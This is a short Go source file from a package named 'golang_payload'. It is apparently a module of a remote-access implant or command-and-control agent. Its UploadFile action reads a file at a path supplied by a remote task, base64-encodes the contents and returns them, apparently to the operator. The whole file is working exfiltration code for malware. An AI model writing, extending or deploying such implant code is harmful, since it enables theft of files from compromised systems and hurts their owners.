package actions

import (
	"bufio"
	"encoding/base64"
	types "golang_payload/types"
	utils "golang_payload/utils"
	"os"
)

func UploadFile(task types.Task) {
	// open the file and encode it to base64
	file, err := os.Open(task.Args["target_path"].(string))

	if err != nil {
		utils.Finish(task, "Could not open file.", false)
		return
	}

	defer file.Close()

	fileInfo, _ := file.Stat()
	var size int64 = fileInfo.Size()
	bytes := make([]byte, size)

	buffer := bufio.NewReader(file)
	_, err = buffer.Read(bytes)

	if err != nil {
		utils.Finish(task, "Could not read file.", false)
		return
	}

	encoded := base64.StdEncoding.EncodeToString(bytes)

	utils.Finish(task, encoded, true)
}
